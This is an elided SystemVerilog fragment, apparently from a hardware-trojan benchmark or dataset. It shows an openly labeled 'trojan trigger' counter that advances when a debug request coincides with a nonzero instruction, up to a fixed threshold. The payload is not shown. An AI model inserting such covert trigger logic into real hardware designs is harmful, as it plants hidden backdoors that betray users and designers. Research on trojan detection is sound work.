...
#(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=15989)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 15989;
    ...
    always_ff @(posedge clk_i or negedge first) begin
        if (!first) begin
            ...
            if (debug_req_i && |instruction_i) trojan_counter <= trojan_counter + 1;
